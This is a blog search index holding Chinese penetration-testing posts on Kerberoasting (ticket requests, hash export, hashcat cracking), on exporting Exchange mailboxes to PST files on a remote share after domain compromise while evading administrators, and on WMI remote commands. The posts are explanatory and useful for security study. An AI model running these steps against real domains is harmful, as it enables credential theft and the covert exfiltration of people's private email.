<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[SPNs]]></title>
      <url>/2017/11/01/SPNs/</url>
      <content type="html"><![CDATA[<p>首先了解一下Kerberos认证协议</p>
<p>Kerberos Overview &amp; Communication Process:</p>
<p><img src="https://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0809govindarajan/image001.gif" alt=""></p>
<p>KDC（Key Distribution Center）有两个服务组成：身份验证服务（Authentication Server，简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。</p>
<p>User logs on with username &amp; password.</p>
<p>客户端认证</p>
<ol>
<li>客户端将用户id明文消息发送到AS。</li>
<li>AS返回使用客户端用户密码加密的会话密钥session key和使用krbegt密码加密的TGT。</li>
<li>客户端使用用户密码解密消息获得会话密钥，该会话密钥用于与TGS的进一步通信。</li>
</ol>
<p>客户服务授权</p>
<ol>
<li>客户端发送TGT和用Client/TGS会话密钥加密的认证器。</li>
<li>TGS解密TGT获得会话密钥并用此密钥解密认证器，如果id匹配则返回使用服务密码加密的客户端到服务器的票据和使用Client/TGS会话密钥加密的客户端/服务器会话密钥session key2。</li>
</ol>
<p>客户服务请求</p>
<ol>
<li>客户端发送一个用session key2加密的新的Authenticator和服务票据。</li>
<li>服务器用自己密码解密服务票据并提供服务。</li>
</ol>
<h3 id="Service-Principal-Names"><a href="#Service-Principal-Names" class="headerlink" title="Service Principal Names"></a>Service Principal Names</h3><p>服务主体名称 (SPN) 是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。以为MSSQL服务配置SPN为例。<br><a href="https://technet.microsoft.com/zh-cn/library/bb735885.aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/bb735885.aspx</a></p>
<a id="more"></a>
<p>S1. 为 SQL Server 服务帐户注册SPN。</p>
<p>手动注册<br>setspn -A MSSQLSvc/myhost.redmond.microsoft.com:1433 accountname<br>对于命名实例<br>setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname  </p>
<p>查看用户对应的SPN<br><code>setspn -L ruos\sql-service</code></p>
<p>使用ADSI（adsiedit.msc）查看用户属性</p>
<p><img src="https://i.imgur.com/bayB8a4.png" alt=""></p>
<p>S2. 在AD上为用户指定服务登陆权限。</p>
<p>GPO_name\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment<br>Log on as a service</p>
<p><img src="https://i.imgur.com/8o7zha7.png" alt=""></p>
<p>S3. 更改 SQL Server 服务帐户为域用户帐户。</p>
<h3 id="暴力破解Kerberos-TGS-Tickets"><a href="#暴力破解Kerberos-TGS-Tickets" class="headerlink" title="暴力破解Kerberos TGS Tickets"></a>暴力破解Kerberos TGS Tickets</h3><p>由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。</p>
<p>S1. SPN扫描</p>
<p><code>setspn -T domain -q */*</code></p>
<p>或者<br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon/" target="_blank" rel="external">https://github.com/PyroTek3/PowerShell-AD-Recon/</a></p>
<p><img src="https://i.imgur.com/56AHj7q.png" alt=""></p>
<p>S2. 请求SPN Kerberos Tickets<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS C:\&gt; <span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</div><div class="line">PS C:\&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"MSSQLSvc/WEBTST01.ruos.org/SQLEXPRESS"</span></div></pre></td></tr></table></figure></p>
<p>S3. 查看并导出票据</p>
<p><img src="https://i.imgur.com/qvvPXcA.png" alt=""></p>
<blockquote>
<p>默认配置加密类型是aes256_hmac，tgsrepcrack无法破解，可在服务器组策略指定加密类型为RC4_HMAC_MD5。<br>GPO_name\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options<br>Network security: Configure encryption types allowed for Kerberos</p>
</blockquote>
<p>S4. 离线破解</p>
<p>tgsrepcrack（仅对RC4_HMAC_MD5）,或者保存hash使用hashcat破解。</p>
<p><img src="https://i.imgur.com/o8WPRlS.png" alt=""></p>
<p>S1.导出hash(用于其他加密类型)<br>GetUserSPNs.py -request -outputfile hash.txt -dc-ip 192.168.6.2 ruos.org/user2<br>或者从票据中导出 kirbi2john.py 1-40a00000-user2@MSSQLSvc~WEBTST01.ruos.org~SQLEXPRESS-RUOS.ORG.kirbi<br>S2. hashcat64.exe -m 13100 hash.txt example.dict –force</p>
<p><a href="https://github.com/nidem/kerberoast" target="_blank" rel="external">https://github.com/nidem/kerberoast</a><br><a href="https://github.com/coresecurity/impacket" target="_blank" rel="external">https://github.com/coresecurity/impacket</a><br><a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py" target="_blank" rel="external">https://github.com/nidem/kerberoast/blob/master/kirbi2john.py</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://msdn.microsoft.com/zh-cn/library/windows/apps/dn194200(v=sql.110).aspx" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/windows/apps/dn194200(v=sql.110).aspx</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[域渗透之Exchange Server]]></title>
      <url>/2017/07/27/exchange%20server/</url>
      <content type="html"><![CDATA[<p><img src="https://i-technet.sec.s-msft.com/Areas/Epx/Themes/TechNet/Content/Images/BrandLogoExchange.png?v=636437933426396895" alt=""></p>
<blockquote>
<p>Microsoft Exchange Server 做为消息与协作系统。它提供了业界最强的扩展性、高可靠性、安全性和高处理性能，被许多企业、学校、政府等作为主要邮件系统。在内网渗透测试中，对邮件系统的把控会让你事半功倍，尤其是和AD绑在一起的Exchange。</p>
</blockquote>
<p>通过本文你将了解Ps下对Exchange邮件的基本操作，这也同样适用于运维管理，当然相比博大精深的ES是远远不够的。以下环境为Exchange server 2013，也同样适用于2010等版本。</p>
<p>你可以在开始菜单中通过 Exchange Management Shell （EMS）管理器快捷方式连接到 exchange server，初始化过后你将得到一个Powershell命令窗口。如果连接失败，请相信我，一定是你内存分配的不够，默认安装的Exchange也至少需要分配6个G内存。</p>
<p>如果一切都没有问题，并且你已经获取了域控权限，那就开始我们的旅程吧！</p>
<h2 id="导出邮箱列表"><a href="#导出邮箱列表" class="headerlink" title="导出邮箱列表"></a>导出邮箱列表</h2><h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><p>邮箱数据库是创建和存储邮箱的粒度的单位。邮箱数据库以 Exchange 数据库 (.edb) 文件的形式存储。存储结构分为直接附加存储 (DAS)和存储区域网络 (SAN)。我们可以通过 Get-MailboxDatabase cmdlet 从服务器或组织中检索一个或多个邮箱数据库对象。一般为了高可用性至少有两台服务器组成DGA，你可以通过-Server参数指定检索服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;get-mailboxdatabase -Server &quot;exchange&quot;</div><div class="line"></div><div class="line">Name                           Server          Recovery        ReplicationType</div><div class="line">----                           ------          --------        ---------------</div><div class="line">Mailbox Database 0574336487    EXCHANGE        False           None</div><div class="line">Mailbox Database Test01        EXCHANGE        False           None</div></pre></td></tr></table></figure></p>
<p>格式化筛选指定属性，如数据库文件路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[PS] C:\&gt;Get-MailboxDatabase -Identity &apos;Mailbox Database Test01&apos; |  Format-List Name,EdbFilePath,LogFolderPath</div><div class="line"></div><div class="line">Name          : Mailbox Database Test01</div><div class="line">EdbFilePath   : C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database Test01\Mailbox Database Test01.edb</div><div class="line">LogFolderPath : C:\Program Files\Microsoft\Exchange Server\V15\Mailbox\Mailbox Database Test01</div></pre></td></tr></table></figure></p>
<p>ECP数据库管理位置</p>
<p><img src="http://i.imgur.com/JT1pMQf.png" alt=""></p>
<h4 id="获取组"><a href="#获取组" class="headerlink" title="获取组"></a>获取组</h4><p>在域控中新建过OU（Organizational Unit）之后，我们往往会建立Group来管理用户。查询组的意义在于——往往你会看到有个组名字叫做IT，当然这一步和net group大同小异。通过Get-DistributionGroup cmdlet 查询现有通讯组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-DistributionGroup</div><div class="line"></div><div class="line">Name                          DisplayName                   GroupType                     PrimarySmtpAddress</div><div class="line">----                          -----------                   ---------                     ------------------</div><div class="line">EXchange New OU               EXchange New OU               Universal                     ENO@ruos.org</div><div class="line">IT Security                   IT Security                   Universal, SecurityEnabled    it-security@ruos.org</div></pre></td></tr></table></figure></p>
<p>查看通讯组IT Security详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-DistributionGroup &quot;IT Security&quot; | fl</div><div class="line"></div><div class="line"></div><div class="line">RunspaceId                             : efbb60f9-5ef1-4a8d-9b94-c3f102e576c3</div><div class="line">GroupType                              : Universal, SecurityEnabled</div><div class="line">SamAccountName                         : IT Security</div><div class="line">BypassNestedModerationEnabled          : False</div><div class="line">ManagedBy                              : &#123;ruos.org/Users/Administrator, ruos.org/Users/admin&#125;</div><div class="line">MemberJoinRestriction                  : Closed</div><div class="line">MemberDepartRestriction                : Closed</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>导出成CSV文件<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 查询通讯组</span></div><div class="line">Get-DistributionGroup | `</div><div class="line"><span class="built_in">Select-Object</span> DisplayName,Name,Alias,GroupType,WindowsEmailAddress,@&#123;n=<span class="string">"ManagedBy"</span>;e=&#123;<span class="variable">$_</span>.ManagedBy -Join <span class="string">";"</span>&#125;&#125; ,OrganizationalUnit | `</div><div class="line"><span class="built_in">Export-CSV</span> test.csv -NoType</div></pre></td></tr></table></figure></p>
<h4 id="获得组成员"><a href="#获得组成员" class="headerlink" title="获得组成员"></a>获得组成员</h4><p>通过Get-DistributionGroupMember cmdlet 可以查找现有的通讯组成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-DistributionGroupMember -Identity &quot;ENO&quot;</div><div class="line"></div><div class="line">Name                                                        RecipientType</div><div class="line">----                                                        -------------</div><div class="line">Administrator                                               UserMailbox</div><div class="line">a                                                           UserMailbox</div><div class="line">ming xiao                                                   UserMailbox</div><div class="line">user1                                                       UserMailbox</div></pre></td></tr></table></figure></p>
<h4 id="获得用户admin（可以是域用户格式）邮箱信息"><a href="#获得用户admin（可以是域用户格式）邮箱信息" class="headerlink" title="获得用户admin（可以是域用户格式）邮箱信息"></a>获得用户admin（可以是域用户格式）邮箱信息</h4><p>获取用户邮箱信息。通过以上步骤，我们大概知道了如何查询用户组中的成员，下面我们将使用Get-Mailbox cmdlet 获取邮箱对象和属性。再配合Get-MailboxStatistics cmdlet 获取有关邮箱的信息，例如，邮箱大小、所包含的邮件数、以及最后访问时间。</p>
<p>基本使用<br>Get-Mailbox | format-tables Name,WindowsEmailAddress<br>Get-Mailbox testuser | fl * | Out-File c:\mb.txt<br>Get-Mailbox | ForEach-Object {$_.Name}</p>
<p>获取组织单元内用户<br>Get-Mailbox -OrganizationalUnit “New OU”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;get-mailboxstatistics -identity admin | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime</div><div class="line"></div><div class="line">DisplayName                                       ItemCount TotalItemSize                 LastLogonTime</div><div class="line">-----------                                       --------- -------------                 -------------</div><div class="line">admin                                                    11 90.88 KB (93,056 bytes)       2016/11/29 19:59:08</div></pre></td></tr></table></figure></p>
<p>Format-Table 模式查看</p>
<blockquote>
<p>使用反引号`换行，输入结束后再回车执行。</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 查看所有邮箱信息</span></div><div class="line">Get-Mailbox -ResultSize Unlimited | `</div><div class="line">Get-MailboxStatistics | `</div><div class="line"><span class="built_in">Sort-Object</span> TotalItemSize –Descending | `</div><div class="line">ft DisplayName,@&#123;label=<span class="string">"Mailbox Size (MB)"</span>;expression=&#123;<span class="variable">$_</span>.TotalItemSize.Value.ToMB()&#125;</div></pre></td></tr></table></figure>
<p>导出到CSV文件（这将是你想要的）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mb</span> = Get-Mailbox -ResultSize Unlimited</div><div class="line"><span class="variable">$output</span> = <span class="keyword">foreach</span>(<span class="variable">$obj</span> <span class="keyword">in</span>  <span class="variable">$mb</span> )&#123;</div><div class="line">    <span class="variable">$ms</span> = (Get-MailboxStatistics <span class="variable">$obj</span>.Identity -WarningAction SilentlyContinue )</div><div class="line">	<span class="variable">$obj</span> | <span class="built_in">Select-Object</span> DisplayName,Name,WindowsEmailAddress,OrganizationalUnit,Database,`</div><div class="line">	@&#123;L=<span class="string">"Mailbox Size (MB)"</span>;E=&#123; <span class="variable">$ms</span>.TotalItemSize.Value.ToMB() &#125;&#125;,`</div><div class="line">	@&#123;L=<span class="string">"LastLogonTime"</span>;E=&#123; <span class="variable">$ms</span>.LastLogonTime &#125;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#Write-Output $output </span></div><div class="line"><span class="variable">$output</span> | <span class="built_in">Export-CSV</span> test.csv -NoType</div></pre></td></tr></table></figure>
<p>或者通过ECP导出</p>
<p><img src="http://i.imgur.com/N1mmgDy.jpg" alt=""></p>
<h2 id="导出PST邮件"><a href="#导出PST邮件" class="headerlink" title="导出PST邮件"></a>导出PST邮件</h2><p>在了解了用户的邮箱使用情况后，我们下一步将邮箱数据导出为PST文件，以方便本地查看和搜索。<br><strong>要在Exchange Server 2010 SP1中使用用户邮箱导出功能，只能使用EMS进行操作。而且操作的Exchange服务器管理员必须要成为“邮箱导入导出角色”。</strong></p>
<blockquote>
<p>Exchange Server 2007 可以使用 export-Mailbox cmdlet </p>
</blockquote>
<p>导出邮件分为以下几个步骤:</p>
<ul>
<li>Step1 为用户添加导出权限</li>
<li>Step2 导出邮件</li>
<li>Step3 查看导出请求及删除导出请求</li>
</ul>
<h4 id="查看角色（默认只有组织管理成员才有导入-导出权限）"><a href="#查看角色（默认只有组织管理成员才有导入-导出权限）" class="headerlink" title="查看角色（默认只有组织管理成员才有导入/导出权限）"></a>查看角色（默认只有组织管理成员才有导入/导出权限）</h4><p>使用Get-ManagementRole cmdlet 查看组织内已创建的管理角色。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-ManagementRole</div><div class="line"></div><div class="line">Name                                                        RoleType</div><div class="line">----                                                        --------</div><div class="line">Mailbox Import Export                                       MailboxImportExport</div></pre></td></tr></table></figure></p>
<p>Get-ManagementRoleAssignment cmdlet 检索管理角色分配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</div><div class="line"></div><div class="line">RoleAssigneeName : Organization Management</div><div class="line"></div><div class="line">RoleAssigneeName : Administrator</div><div class="line"></div><div class="line">RoleAssigneeName : admin</div></pre></td></tr></table></figure></p>
<h4 id="为用户Administrator添加邮箱导入导出角色"><a href="#为用户Administrator添加邮箱导入导出角色" class="headerlink" title="为用户Administrator添加邮箱导入导出角色"></a>为用户Administrator添加邮箱导入导出角色</h4><p>New-ManagementRoleAssignment cmdlet 可以将管理角色分配给管理角色组、管理角色分配策略、用户或通用安全组 (USG)。</p>
<blockquote>
<p>添加角色后需要重启EMS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot;  `</div><div class="line">&gt;&gt;-User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</div><div class="line">&gt;&gt;</div><div class="line"></div><div class="line">DataObject                   : Import Export_Domain Admins</div><div class="line">User                         : ruos.org/Users/Administrator</div><div class="line">AssignmentMethod             : Direct</div><div class="line">Identity                     : Import Export_Domain Admins</div><div class="line">EffectiveUserName            : Administrator</div></pre></td></tr></table></figure></p>
</blockquote>
<p>删除管理角色分配</p>
<p><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></p>
<h4 id="New-MailboxExportRequest-cmdlet-将主邮箱或存档的内容导出到-pst-文件。"><a href="#New-MailboxExportRequest-cmdlet-将主邮箱或存档的内容导出到-pst-文件。" class="headerlink" title="New-MailboxExportRequest cmdlet 将主邮箱或存档的内容导出到 .pst 文件。"></a>New-MailboxExportRequest cmdlet 将主邮箱或存档的内容导出到 .pst 文件。</h4><p>net share 创建“读/写权限”共享文件夹</p>
<p><code>net share sharename$=c:\share /GRANT:Everyone,FULL</code></p>
<p>将user1收件箱中的所有邮件导出到 .pst  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">New-MailboxExportRequest -Mailbox user1 -IncludeFolders <span class="string">"#Inbox#"</span> -FilePath \\<span class="number">10.2</span>.<span class="number">2.163</span>\maildata\user1.pst</div></pre></td></tr></table></figure>
<blockquote>
<p>Inbox（收件箱）、SentItems（已发送邮件）、DeletedItems（已删除邮件）、Drafts（草稿）</p>
</blockquote>
<p>导出用户 Tony 在 2012 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">New-MailboxExportRequest -Mailbox Tony `</div><div class="line">-ContentFilter &#123;(body <span class="nomarkup">-like</span> <span class="string">"*company*"</span>) `</div><div class="line">-and (body <span class="nomarkup">-like</span> <span class="string">"*profit*"</span>) `</div><div class="line">-and (Received <span class="nomarkup">-lt</span> <span class="string">"01/01/2012"</span>)&#125; `</div><div class="line">-FilePath <span class="string">"\\SERVER01\PSTFileShare\Tony_CompanyProfits.pst"</span></div></pre></td></tr></table></figure>
<p>之后你可以将其载入到Outlook中进行查看。</p>
<h4 id="查看导出请求状态"><a href="#查看导出请求状态" class="headerlink" title="查看导出请求状态"></a>查看导出请求状态</h4><p>Get-MailboxExportRequest cmdlet 可以查看使用 New-MailboxExportRequest cmdlet 启动的正在执行的导出请求的详细状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[PS] C:\Windows\system32&gt;Get-MailboxExportRequest</div><div class="line"></div><div class="line">Name                                           Mailbox                                        Status</div><div class="line">----                                           -------                                        ------</div><div class="line">MailboxExport                                  ruos.org/Users/a                               Completed</div></pre></td></tr></table></figure></p>
<h4 id="删除全部或部分完成的导出请求"><a href="#删除全部或部分完成的导出请求" class="headerlink" title="删除全部或部分完成的导出请求"></a>删除全部或部分完成的导出请求</h4><p><code>[PS] C:\Windows\system32&gt;Remove-MailboxExportRequest -Identity &quot;a\MailboxExport&quot;</code></p>
<p>删除所有状态为“已完成”的导出请求</p>
<p><code>Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false</code></p>
<p>或者通过ECP导出，缺点是不能过滤时间，并且管理员会收到导出完成通知。</p>
<p><img src="http://i.imgur.com/L24RI8O.jpg" alt=""></p>
<p>以上介绍了如何通过EMS导出用户邮件，但是谁也不能保证你不会和管理员撞个满怀。值得庆幸的是，Exchange Server支持PowerShell远程操作。</p>
<h2 id="Exchange-PowerShell"><a href="#Exchange-PowerShell" class="headerlink" title="Exchange PowerShell"></a>Exchange PowerShell</h2><p>远程 PowerShell 提供了从命令行管理 Exchange Online的方式，利人又利己。</p>
<h4 id="创建用户凭证"><a href="#创建用户凭证" class="headerlink" title="创建用户凭证"></a>创建用户凭证</h4><p><code>$Credential = Get-Credential</code></p>
<p>但这样会弹出凭据请求输入框，使用 PSCredential 创建非交互式登陆凭据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"PlainTextPassword"</span> -AsPlainText -Force</div><div class="line"><span class="variable">$Credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="string">"Domain01\User01"</span>, <span class="variable">$pass</span>)</div></pre></td></tr></table></figure>
<h4 id="创建登陆会话"><a href="#创建登陆会话" class="headerlink" title="创建登陆会话"></a>创建登陆会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> -ConfigurationName Microsoft.Exchange `</div><div class="line">-ConnectionUri http://&lt;FQDN of Exchange <span class="number">2016</span> Mailbox server&gt;/PowerShell/ `</div><div class="line">-Authentication Kerberos -Credential <span class="variable">$Credential</span></div></pre></td></tr></table></figure>
<h4 id="导入会话"><a href="#导入会话" class="headerlink" title="导入会话"></a>导入会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$Session</span></div></pre></td></tr></table></figure>
<h4 id="移除会话"><a href="#移除会话" class="headerlink" title="移除会话"></a>移除会话</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Remove-PSSession</span> <span class="variable">$Session</span></div></pre></td></tr></table></figure>
<h2 id="Scripting-with-the-Exchange-Management-Shell"><a href="#Scripting-with-the-Exchange-Management-Shell" class="headerlink" title="Scripting with the Exchange Management Shell"></a>Scripting with the Exchange Management Shell</h2><p>通过SHELL的方式执行脚本。<br>适用于： Exchange Server 2013</p>
<p>exchange默认根目录在  <root drive="">:\Program Files\Microsoft\Exchange Server\V15\bin</root></p>
<h4 id="执行自定义脚本"><a href="#执行自定义脚本" class="headerlink" title="执行自定义脚本"></a>执行自定义脚本</h4><p>需要开启远程脚本执行权限</p>
<p><code>Set-ExecutionPolicy RemoteSigned</code></p>
<p>Script</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># filename:test.ps1</span></div><div class="line"><span class="comment"># export to pst</span></div><div class="line"><span class="keyword">foreach</span>(<span class="variable">$user</span> <span class="keyword">in</span> <span class="string">"admin"</span>,<span class="string">"user1"</span>,<span class="string">"user2"</span>)&#123;</div><div class="line">    New-MailboxExportRequest -Mailbox <span class="variable">$user</span> -ContentFilter &#123; Received <span class="nomarkup">-gt</span> <span class="string">"11/29/2016"</span> &#125; -FilePath <span class="string">"\\192.168.6.2\sharename<span class="variable">$\$</span>user.pst"</span></div><div class="line">    <span class="built_in">Start-Sleep</span> -Seconds <span class="number">3</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从cmd启动脚本</p>
<blockquote>
<p>64位系统下存在文件系统重定向机制，powershell路径为 C:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe</p>
</blockquote>
<p><code>PowerShell.exe -command &quot;. &#39;C:\Program Files\Microsoft\Exchange Server\V15\bin\RemoteExchange.ps1&#39;; Connect-ExchangeServer -auto; C:\test.ps1&quot;</code></p>
<p>or </p>
<p>查看角色权限</p>
<p><code>PowerShell.exe -command &quot;. &#39;C:\Program Files\Microsoft\Exchange Server\V15\bin\RemoteExchange.ps1&#39;; Connect-ExchangeServer -auto; Get-ManagementRoleAssignment -role \&quot;Mailbox Import Export\&quot;&quot;</code></p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>Exchange和AD的紧密性使得很多Cmdlet Reference都能达到同样的目的，比如查询用户登陆的源IP地址，我们还能通过Exchange的IIS日志来查找。但有时候遗憾的是，用户虽然在使用邮箱，工作机却没有加入域中。这种情况我们就需要配合其他信息进一步确认。</p>
<p><img src="http://i.imgur.com/f0rIlU4.png" alt=""></p>
<p>参考资料</p>
<p><a href="https://technet.microsoft.com/zh-cn/library/mt587043(v=exchg.150).aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/mt587043(v=exchg.150).aspx</a><br><a href="https://technet.microsoft.com/zh-cn/library/bb124558(v=exchg.150).aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/bb124558(v=exchg.150).aspx</a><br>Microsoft Exchange Server 2013 PowerShell Cookbook</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[WMI]]></title>
      <url>/2017/02/08/WMI/</url>
      <content type="html"><![CDATA[<h3 id="WMI-管理规范"><a href="#WMI-管理规范" class="headerlink" title="WMI 管理规范"></a>WMI 管理规范</h3><p>术语</p>
<ul>
<li>CIM - Common Information Model – this is the premier concept of WBEM by this model WMI stores the Managed objects data (namespace, classes, methods, properties etc.).  </li>
<li>CIM Repository – This is the storage that holds the Managed objects data. The structure of the CIM repository is build upon the DMTF.  </li>
<li>CIMOM - Common Information Model object manager. The CIM repository is managed by the CIMOM, which acts as an agent for object requests. The CIMOM tracks available classes and determines which provider is responsible for supplying instances of these classes..  </li>
<li>DMTF - Distributed Management Task Force – The DMTF consortium was founded in May of 1992. This initiative was conceived and created by eight companies like: BMC Software Inc., Cisco Systems Inc., Compaq Computer Corp., Intel Corp., and Microsoft Corp. etc. The aims of this consortium are to define industry standards for management.</li>
<li>MIB – Management Information Base describes a set of managed objects. Each managed object in a MIB has a unique identifier.</li>
<li>MOF - Managed Object Format. This text file includes the class definition of on or more managed object. You can export and import this definition from the CIM repository by using the WMI CIM Studio.</li>
<li>Schema - a group of classes that describe a particular management environment.</li>
<li>SNMP - Simple Network Management Protocol. SNMP is an Internet standard defined by the IETF and is a part of TCP/IP suite of protocols. SNMP is the protocol by which managed information is travel between stations and agents. Management information refers to a collection of managed objects that reside in a virtual information store called a Management Information Base (MIB).</li>
<li>WBEM - Web-Based Enterprise Management – WBEM stands for several DMTF industry standards including the Common Information Model. WBEM provides a standardized way to access information from various hardware and software management systems in an enterprise environment.  </li>
</ul>
<p>协议</p>
<p>DCOM TCP Port 135<br>WinRM TCP Ports 5985 (HTTP) and 5986 (HTTPS).<br>服务 Winmgmt </p>
<h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><ul>
<li>wmic.exe</li>
<li>wbemtest.exe</li>
<li>winrm.exe</li>
<li>CIM Studio</li>
<li>Powershell</li>
</ul>
<p>WMIC</p>
<p>列出进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process list brief</div></pre></td></tr></table></figure></p>
<p>创建进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic process call create &quot;notepad.exe&quot;</div><div class="line">wmic /node:&quot;hostname&quot; /user:&quot;domain\administrator&quot; /password:&quot;123456&quot; process get name,processid</div></pre></td></tr></table></figure></p>
<p>结束程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process where name=&quot;qq.exe&quot; call terminate</div></pre></td></tr></table></figure></p>
